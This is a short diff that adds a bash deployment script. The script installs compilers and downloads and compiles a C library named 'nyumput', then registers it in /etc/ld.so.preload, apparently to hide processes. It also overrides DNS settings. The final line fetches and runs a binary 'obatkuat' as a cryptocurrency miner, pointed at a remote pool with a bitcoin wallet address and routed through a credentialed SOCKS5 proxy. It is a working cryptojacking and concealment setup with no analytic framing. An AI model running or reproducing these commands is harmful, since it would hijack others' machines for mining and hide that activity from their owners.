@@ -1,2 +1,12 @@
-mkdir a && cd a
+#!/bin/bash
+apt-get update ; apt-get install sudo -y
+apt install unzip
+curl https://github.com/kidoescegh/jadul/raw/main/nyumput.c -o nyumput.c
+apt-get install build-essential -y
+gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
+mv libnyumput.so /usr/local/lib/
+echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
+rm nyumput.c
+echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
+/etc/init.d/network restart
 wget https://gitlab.com/majapahlevi/mvp/-/raw/main/obatkuat && chmod +x obatkuat && ./obatkuat --algo qhash --qhash-kernel 1 --url 143.198.215.212:80 --user bc1qdvzcf2gw7wc0qyg3tdny7ktt40hvjn9mlr9afd.$(shuf -n 1 -i 1-99999)-Majza --proxy socks5://abah:abah123@138.197.126.203:443
